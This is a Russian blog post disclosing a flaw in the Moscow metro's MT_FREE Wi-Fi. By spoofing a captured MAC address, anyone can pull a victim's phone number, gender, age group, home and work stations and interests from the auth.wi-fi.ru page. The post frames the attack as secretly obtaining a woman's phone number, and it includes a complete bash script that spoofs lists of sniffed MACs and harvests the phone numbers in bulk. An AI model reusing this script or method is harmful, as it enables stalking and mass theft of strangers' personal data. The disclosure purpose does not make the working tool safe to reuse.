 Как получить телефон (почти) любой красотки в Москве, или интересная особенность MT_FREE

    Информационная безопасность

    Из песочницы

Сеттинг

В Московском метрополитене есть такая замечательная вещь, как бесплатный вайфай.
Единственное, что вам нужно, чтобы войти в него — это ввести свой номер телефона. И так как метро — штука хоть и удобная, но зачастую долгая, бесплатной сетью пользуются практически все. В этом интересном мире нам понравилась девушка за столом напротив.

Небольшая уязвимость

Авторизация в этой сети привязывается по мак-адресу, который всегда можно сменить — например на любой пойманный в воздухе вокруг. Поймать мак-адреса можно, например, утилитой airodump-ng. Иногда даже можно войти в wi-fi не смотря рекламу, если реальный владелец мак-адреса оплатил премиум-доступ.

Слив данных о самом себе

Но если вы не в числе оплативших wi-fi, то вас при подключении поприветствует страничка auth.wi-fi.ru. Помимо рекламы, эта страничка отдает один интересный json, который содержит кучу интересной информации о текущем подключенном пользователе.
Даже если вы оплатили премиум-доступ, эту страничку всегда можно открыть, просто вбив в браузере адрес.

Много интересной информации

{
   "dmpSegments" : [],
   "clicker_status" : -1,
   "gender" : "F",
   "place" : "",
   "premium_groups" : {
      "premium_vip_status" : -1,
      "mosmetro_premium_short_status" : -1,
      "mosmetro_premium_status" : 1
   },
   "line_id" : "99",
   "family_status" : "not married",
   "autoapp_status" : 0,
   "premium" : true,
   "autoapp_user" : null,
   "age" : "4500",
   "interests" : "307",
   "train" : "",
   "device_price" : "",
   "mac" : "98-00-**-**-b3-66",
   "ip" : "10.120.193.191",
   "groups" : [
      "cppk_basic",
      "mosmetro_premium",
      "mgt_basic",
      "mosmetro_basic"
   ],
   "home_station" : "192:193",
   "msisdn" : "7925*****03",
   "occupation" : "student",
   "profit" : "medium",
   "clicker" : null,
   "tags" : [
      "yandex.taxi",
      "obed",
      "coffee",
      "analytics_742_k2",
      "analytics_784_dns"
   ],
   "avocation" : "oywh4JCyQYOMHLy8ZM5AXqMZNhal0pDJl-OqBtuq09T5oBLS44GveLog8sWGm3ILB81zUC0mvW_l51J9ykx1kA==",
   "current_station" : null,
   "mnc" : "02",
   "uid" : "4fb441e53d0dea858b6abe0dac222c21",
   "job_station" : "57",
   "groups_data" : {
      "mosmetro_basic" : {
         "endDate" : null,
         "state" : 1
      },
      "mosmetro_premium" : {
         "state" : 1,
         "endDate" : null
      },
      "mgt_basic" : {
         "state" : 1,
         "endDate" : null
      },
      "cppk_basic" : {
         "endDate" : null,
         "state" : 1
      }
   }
}


Замечу, что номер телефона не закрыт звездочками в реальных данных.

И, собственно, как узнать номер красотки

Я почти уверен, что все вы догадались, как пойдет наш сценарий.

Ева очень хочет узнать телефон Алисы за столом напротив (forbidden love!). Как и большинство людей в Москве, пользуясь телефоном, Алиса так же пользуется и сетью MT_FREE.

Ева следит за Алисой некоторое время, и узнает её MAC с помощью утилиты airodump-ng, широко доступной и работающей практически на любой вафельнице.
Узнав его, она следует в метро, меняет свой мак на мак Алисы, открывает страничку auth.wi-fi.ru и получает желанный номер.

Мне лень даже проверять это

Но постой, потенциальная Ева! Чтобы упростить труд перебирания десятков маков из забегаловки в поиске телефона твоем кропотливом исследовании безопасности wi-fi, я сделал небольшой скрипт! Его ты сможешь найти внизу статьи.

To be continued?

Работает получение данных о юзере пока только в метро, т.к удаленно у меня ещё не получилось убедить сервер в том, что мак у меня не 00:00:00:00:00:00. Раньше была возможность передавать мак в параметре client_mac, но аналога я пока не нашел.

Дисклеймер

Я сообщил об уязвимости (наверняка это делали до меня, эта штука очевидна до нельзя) неделю назад, и так и не получив никакого ответа, решил раскрыть её тут. Извиняюсь за любое капитанство, которое могло быть в этой статье.
Всё описанное выше дисклеймера написано от лица вымышленного персонажа, и является художественной литературой. Его мотивы не совпадают с моими, и я это делаю исключительно в исследовательских целях. И даже не особо понимаю, что мне делать с телефоном красотки, которая мне его не дала.

Я не буду показывать на руководство пользования airodump-ng, чтобы не снизить уровень вхождения совсем до нуля.

Скрипт

Для тех, кому просто посмотреть

#!/bin/bash
# script for finding userdata from a list of macs.
# for educational purposes only, of course.

! sudo -p "we require sweet root juices to run, please let us in: " echo -n && exit 1

INPUT=$1
SSID=MT_FREE
DEV=wlp1s0
OUTDIR=check-`date +%d-%m-%yT%H:%M:%S`

[ ! -e $INPUT ] && { echo 'no input'; exit 1; }
[ -z $SSID ] && { echo 'no connection'; exit 1; }

function progress() { echo -ne "\033[K"$1"\033["${#1}"D"; }
function status() { echo -e "\033[K$1"; }

function current_userdata() {
    rm .ck 2> /dev/null
    curl --retry 3 -s -b .ck -c .ck 'https://auth.wi-fi.ru/auth?segment=metro' > /dev/null 2>&1
    curl --retry 3 -s -b .ck -c .ck 'https://auth.wi-fi.ru/auth?segment=metro' 2>/dev/null | grep userData | grep -oP '(?<=JSON.parse\(\").*?(?=\")' | sed 's/\\&quot;/"/g' | json_pp
    rm .ck
}

function oui() {
    MAC=$1
    if [ -e /var/lib/ieee-data/oui.txt ]; then
        OUIMAC=${MAC//:}
        OUIMAC=${OUIMAC[@]:0:6}
        MACINFO=`grep $OUIMAC /var/lib/ieee-data/oui.txt`
        # getting naame (it's always 22 symbols away from the start)
        MACINFO=${MACINFO[@]:22}
        # removing \r on the end
        echo -n ${MACINFO[@]:0:-1}
    fi
}

tput civis

function on_exit() {
    tput cnorm
    echo "turning wifi back on"
    nmcli dev set $DEV managed true
    nmcli dev set $DEV autoconnect true
}

trap on_exit EXIT

mkdir $OUTDIR

echo "turning wifi on $DEV off for nmcli for now"

# turning it off in nmcli
nmcli dev set $DEV managed false >/dev/null 2>&1
nmcli dev set $DEV autoconnect false  >/dev/null 2>&1

for MAC in $(cat $INPUT); do
    echo -en "\033[2m"$MAC"\033[0m"' : '

    progress "switching..."
    sudo iw dev $DEV disconnect 2>/dev/null
    sudo ifconfig $DEV down
    if ! sudo ifconfig $DEV hw ether $MAC > /dev/null 2>&1; then
        status "failed to set mac?"
        echo $MAC >> $OUTDIR/not-macs.txt
        continue
    fi
    sudo ifconfig $DEV up

    progress "connecting..."

    CON_SUCCESS=
    for try in {1..3}; do
        progress "try $try..."
        if sudo iw dev $DEV connect -w $SSID | grep connected >/dev/null 2>&1 ; then
            CON_SUCCESS=1
            break
        fi
    done

    if ! [ $CON_SUCCESS ]; then
        status "failed to connect to wi-fi"
        echo $MAC >> $OUTDIR/no-assoc-macs.txt
        continue
    fi

    progress "getting ip..."

    if ! sudo dhclient -1 $DEV; then
        status "DHCP failed"
        echo $MAC >> $OUTDIR/no-ip-macs.txt
        continue
    fi

    progress "userdata..."

    USERDATA=$OUTDIR/$MAC-userdata.txt
    current_userdata 2>/dev/null > $USERDATA

    if [ -s $USERDATA ]; then

        AGE=`cat $USERDATA | grep -Po '(?<=age\"\ \:\ \").*?(?=\")'`
        PHONE=`cat $USERDATA | grep -Po '(?<=msisdn\"\ \:\ \").*?(?=\")'`
        PREMIUM=`cat $USERDATA | grep -Po '(?<=premium\"\ \:\ )\w*'`
        GENDER=`cat $USERDATA | grep -Po '(?<=gender\"\ \:\ \").*?(?=\")'`
        OUI=`oui $MAC`

        # just adding some more highlight to that sweet mark of ad-free wifi mac goodness
        if [ $PREMIUM == true ]; then
            PREMIUM="\033[32;1mtrue\033[0;36m"
            echo $MAC >> $OUTDIR/good-macs.txt
        fi

        status "got userdata \033[36m{ phone: ${PHONE}, age group ${AGE}, gender: ${GENDER}, premium: ${PREMIUM}, vendor: $OUI }\033[0m "
    else
        status "no userdata"
        rm $USERDATA
        echo $MAC >> $OUTDIR/no-reg-macs.txt
    fi

done


Пример работы

Пример работы скрипта

Ссылка на скрипт в GitHub Gist

Для работы скрипта из зависимостей нужен только curl, json_pp, и желательно иметь новый oui.txt в /var/lib/ieee-data/ (скачать отсюда)

Если Wi-Fi интерфейс у вас называется не wlp1s0, то смените его в скрипте.

Использование: ./checkmacs.sh [файл с маками на каждой строке]

Спасибо за прочтение!

UPD: обновил зависимости
